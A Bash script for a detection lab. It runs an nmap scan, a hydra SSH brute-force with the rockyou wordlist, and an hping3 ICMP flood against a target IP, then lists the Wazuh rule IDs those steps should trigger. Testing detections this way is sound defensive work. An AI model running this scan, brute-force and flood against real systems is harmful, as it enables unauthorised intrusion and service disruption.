#!/usr/bin/env bash

set -euo pipefail

SCRIPT_NAME="$(basename "$0")"

TARGET_IP=""
SSH_USER="invaliduser"
WORDLIST="/usr/share/wordlists/rockyou.txt"
SCAN_PORTS="1-200"
ICMP_SECONDS=12
SKIP_SCAN=0
SKIP_BRUTEFORCE=0
SKIP_ICMP=0
DRY_RUN=0

usage() {
  cat <<EOF
Usage:
  $SCRIPT_NAME --target-ip <IP_LINUX> [options]

Required:
  --target-ip <ip>              Linux target IP (UBUNTU-SRV1)

Options:
  --ssh-user <name>             SSH username for brute-force test (default: $SSH_USER)
  --wordlist <path>             Wordlist for hydra (default: $WORDLIST)
  --scan-ports <range>          Nmap port range (default: $SCAN_PORTS)
  --icmp-seconds <n>            ICMP flood duration in seconds (default: $ICMP_SECONDS)
  --skip-scan                   Skip nmap step
  --skip-bruteforce             Skip hydra step
  --skip-icmp                   Skip hping3 ICMP flood step
  --dry-run                     Print commands only
  --help                        Show this help

Example:
  sudo ./$SCRIPT_NAME --target-ip 10.10.0.22
EOF
}

require_command() {
  local cmd="$1"
  if ! command -v "$cmd" >/dev/null 2>&1; then
    echo "[ERROR] Missing command: $cmd"
    exit 1
  fi
}

run_cmd() {
  local label="$1"
  shift
  echo
  echo "[STEP] $label"
  echo "[CMD ] $*"

  if [[ "$DRY_RUN" -eq 1 ]]; then
    return 0
  fi

  "$@"
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target-ip)
      TARGET_IP="$2"
      shift 2
      ;;
    --ssh-user)
      SSH_USER="$2"
      shift 2
      ;;
    --wordlist)
      WORDLIST="$2"
      shift 2
      ;;
    --scan-ports)
      SCAN_PORTS="$2"
      shift 2
      ;;
    --icmp-seconds)
      ICMP_SECONDS="$2"
      shift 2
      ;;
    --skip-scan)
      SKIP_SCAN=1
      shift
      ;;
    --skip-bruteforce)
      SKIP_BRUTEFORCE=1
      shift
      ;;
    --skip-icmp)
      SKIP_ICMP=1
      shift
      ;;
    --dry-run)
      DRY_RUN=1
      shift
      ;;
    --help)
      usage
      exit 0
      ;;
    *)
      echo "[ERROR] Unknown option: $1"
      usage
      exit 1
      ;;
  esac
done

if [[ -z "$TARGET_IP" ]]; then
  echo "[ERROR] --target-ip is required"
  usage
  exit 1
fi

if [[ "$SKIP_SCAN" -eq 0 ]]; then
  require_command nmap
fi

if [[ "$SKIP_BRUTEFORCE" -eq 0 ]]; then
  require_command hydra
  if [[ ! -f "$WORDLIST" ]]; then
    echo "[ERROR] Wordlist not found: $WORDLIST"
    exit 1
  fi
fi

if [[ "$SKIP_ICMP" -eq 0 ]]; then
  require_command hping3
  require_command timeout
fi

NMAP_SCAN_TYPE="-sS"
if [[ ${EUID:-99999} -ne 0 ]]; then
  NMAP_SCAN_TYPE="-sT"
  if [[ "$SKIP_ICMP" -eq 0 ]]; then
    echo "[WARN ] Non-root mode detected. ICMP flood requires root, step skipped."
    SKIP_ICMP=1
  fi
fi

echo "[INFO ] Target Linux IP: $TARGET_IP"
echo "[INFO ] This script is for authorized lab use only."

if [[ "$SKIP_SCAN" -eq 0 ]]; then
  run_cmd \
    "Linux TCP scan to trigger UFW and port-scan correlation rules" \
    nmap "$NMAP_SCAN_TYPE" -Pn -p "$SCAN_PORTS" "$TARGET_IP"
fi

if [[ "$SKIP_BRUTEFORCE" -eq 0 ]]; then
  echo
  echo "[STEP] Linux SSH brute-force simulation to trigger failed-auth and bruteforce rules"
  echo "[CMD ] hydra -l $SSH_USER -P $WORDLIST ssh://$TARGET_IP -t 4 -f"

  if [[ "$DRY_RUN" -eq 0 ]]; then
    set +e
    hydra -l "$SSH_USER" -P "$WORDLIST" "ssh://$TARGET_IP" -t 4 -f
    hydra_exit=$?
    set -e

    if [[ "$hydra_exit" -gt 1 ]]; then
      echo "[WARN ] Hydra returned non-standard exit code: $hydra_exit"
      echo "[WARN ] This can still produce Wazuh events if partial attempts happened."
    fi
  fi
fi

if [[ "$SKIP_ICMP" -eq 0 ]]; then
  run_cmd \
    "Linux ICMP flood (short burst) to trigger ICMP flood correlation" \
    timeout "$ICMP_SECONDS" hping3 --icmp --flood "$TARGET_IP"
fi

cat <<EOF

[DONE ] Attack simulation complete.

Expected Linux Wazuh rule.id values:
- 100402, 100404, 100407, 100400, 100401, 100403
- 100460, 100461
- 100405, 100410

Next step:
- Run scripts/validate_phase4_rule_ids.py to verify detections automatically.
EOF
